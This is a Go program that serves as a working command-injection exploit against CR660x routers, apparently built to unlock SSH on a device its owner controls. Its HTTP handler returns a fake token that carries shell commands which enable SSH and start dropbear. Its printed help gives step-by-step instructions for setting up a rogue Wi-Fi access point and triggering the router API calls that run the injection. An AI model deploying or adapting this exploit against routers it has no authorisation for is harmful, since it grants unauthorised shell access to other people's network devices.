package main

import (
	"fmt"
	"net/http"

	"github.com/gin-gonic/gin"
)

func serve() {
	addr := "0.0.0.0:80"
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()
	r.Any("/cgi-bin/luci/api/xqsystem/token", func(ctx *gin.Context) {
		ctx.Header("Content-Type", "application/json")
		ctx.String(http.StatusOK, `{"token":"; nvram set ssh_en=1; nvram commit; sed -i 's/channel=.*/channel=\"debug\"/g' /etc/init.d/dropbear; /etc/init.d/dropbear start;","code":0}`)
	})
	r.NoRoute(func(ctx *gin.Context) {
		ctx.String(http.StatusOK, "CR660x exploit server is up and running")
	})
	fmt.Println("HTTP Server will listen at " + addr)
	err := r.Run(addr)
	if err != nil {
		panic(err)
	}
}

func printHelp() {
	fmt.Println("cr660x-exploit-server")
	fmt.Println("0. Reset your CR660x to default setting")
	fmt.Println("1. [PC] Setup this PC as a Wifi AP: SSID=cr660xploit, PWD=12345678")
	fmt.Println("2. [PC] Config Wifi AP with DHCP off, static IP of 169.254.31.1")
	fmt.Println("3. [CR660x] Login into CR660x admin and check if URL in addressbar is something like this http://{CR660x}/cgi-bin/luci/;stok={STOK}/web/home#router. Remember {STOK}")
	fmt.Println("4. [CR660x] Visit http://{CR660x}/cgi-bin/luci/;stok={STOK}/api/misystem/extendwifi_connect?ssid=cr660xploit&password=12345678. It should return 0")
	fmt.Println("5. [CR660x] Visit http://{CR660x}/cgi-bin/luci/;stok={STOK}/api/xqsystem/oneclick_get_remote_token?username=xxx&password=xxx&nonce=xxx. The device now is expoited with SSH enabled")
	fmt.Println("")
}

func main() {
	printHelp()
	serve()
}
